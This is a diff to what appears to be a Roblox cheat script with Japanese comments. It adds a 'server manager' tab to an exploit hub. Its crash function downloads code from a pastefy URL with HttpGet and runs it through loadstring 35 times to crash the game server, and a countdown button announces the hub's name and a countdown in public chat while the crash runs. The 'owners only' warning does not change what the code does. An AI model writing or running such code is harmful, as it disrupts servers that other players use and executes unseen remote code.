@@ -4563,6 +4563,168 @@ do
 end
 
 -- ============================================================================
+-- ブロック31.5 [JP]: サーバーマネージャータブ（日本語版）
+-- 攻撃系タブ（ブロック31）の直後に挿入
+-- ============================================================================
+do
+    local Window = _G.Window
+    local OrionLib = _G.OrionLib
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local TextChatService = game:GetService("TextChatService")
+
+    -- ========================================================================
+    -- チャット送信ヘルパー
+    -- mode: "normal"（全員に通常メッセージ） / "system"（自分にだけシステムメッセージ）
+    -- ========================================================================
+    local function sendChatMessage(message, mode)
+        mode = mode or "normal"
+
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local textChannels = TextChatService:WaitForChild("TextChannels")
+            local generalChannel = textChannels:WaitForChild("RBXGeneral")
+
+            if mode == "system" then
+                generalChannel:DisplaySystemMessage(message)
+            else
+                generalChannel:SendAsync(message)
+            end
+        else
+            -- レガシーチャット用フォールバック
+            local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+            if events then
+                local sayMessageRequest = events:FindFirstChild("SayMessageRequest")
+                if sayMessageRequest then
+                    sayMessageRequest:FireServer(message, "All")
+                end
+            end
+        end
+    end
+
+    -- ========================================================================
+    -- クラッシュスクリプト実行（35回連続）
+    -- ========================================================================
+    local function runCrashScript()
+        local url = "https://pastefy.app/sPciZuXM/raw"
+        local ok, err = pcall(function()
+            local scriptContent = game:HttpGet(url)
+            for i = 1, 35 do
+                pcall(function()
+                    loadstring(scriptContent)()
+                end)
+                task.wait(0.1)
+            end
+        end)
+        return ok, err
+    end
+
+    -- ========================================================================
+    -- タブ作成
+    -- ========================================================================
+    local CrashTab = Window:MakeTab({
+        Name = "サーバーマネージャー",
+        Icon = "rbxassetid://4483345998",
+        PremiumOnly = false
+    })
+
+    CrashTab:AddParagraph(
+        "⚠️ 悪用禁止",
+        "サーバーオーナー用の試験向け機能です。\n" ..
+        "他人のサーバーで実行しないでください。"
+    )
+
+    CrashTab:AddSection({ Name = "試験実行" })
+
+    -- ========================================================================
+    -- 既存：サーバークラッシュテスト（35回連続）
+    -- ========================================================================
+    CrashTab:AddButton({
+        Name = "⚡ サーバークラッシュテスト（35回連続実行）",
+        Callback = function()
+            PlayActionSound()
+            OrionLib:MakeNotification({
+                Name = "サーバークラッシュテスト",
+                Content = "35回連続実行を開始します...",
+                Time = 3
+            })
+
+            task.spawn(function()
+                local ok, err = runCrashScript()
+                if ok then
+                    PlayActionSound()
+                    OrionLib:MakeNotification({
+                        Name = "完了",
+                        Content = "35回の実行が完了しました",
+                        Time = 5
+                    })
+                else
+                    PlayErrorSound()
+                    OrionLib:MakeNotification({
+                        Name = "エラー",
+                        Content = "実行中にエラーが発生しました: " .. tostring(err),
+                        Time = 5
+                    })
+                end
+            end)
+        end
+    })
+
+    -- ========================================================================
+    -- 新規：カウントダウン
+    -- 流れ：
+    --   1. "SakuraHUB-by-Nuked" をチャット送信
+    --   2. 少し待って、クラッシュスクリプト実行を開始
+    --   3. "5" → "4" → "3" → "2" を1秒間隔でチャット送信
+    -- ========================================================================
+    CrashTab:AddButton({
+        Name = "⏱ カウントダウン",
+        Callback = function()
+            PlayActionSound()
+
+            task.spawn(function()
+                -- 1. 最初のメッセージ
+                pcall(function() sendChatMessage("SakuraHUB-by-Nuked", "normal") end)
+                task.wait(0.8)
+
+                -- 2. クラッシュスクリプト開始（5のあたりで実行）
+                task.spawn(function()
+                    local ok, err = runCrashScript()
+                    if not ok then
+                        PlayErrorSound()
+                        OrionLib:MakeNotification({
+                            Name = "エラー",
+                            Content = "クラッシュスクリプト実行失敗: " .. tostring(err),
+                            Time = 5
+                        })
+                    end
+                end)
+
+                task.wait(0.2)
+
+                -- 3. カウントダウン送信（5 → 4 → 3 → 2）
+                pcall(function() sendChatMessage("5", "normal") end)
+                task.wait(1)
+
+                pcall(function() sendChatMessage("4", "normal") end)
+                task.wait(1)
+
+                pcall(function() sendChatMessage("3", "normal") end)
+                task.wait(1)
+
+                pcall(function() sendChatMessage("2", "normal") end)
+
+                -- 4. 完了通知
+                PlayActionSound()
+                OrionLib:MakeNotification({
+                    Name = "カウントダウン完了",
+                    Content = "クラッシュスクリプトを実行しました",
+                    Time = 4
+                })
+            end)
+        end
+    })
+end
+
+-- ============================================================================
 -- ブロック32: 汽車を乗っ取るタブ
 -- ============================================================================
 do
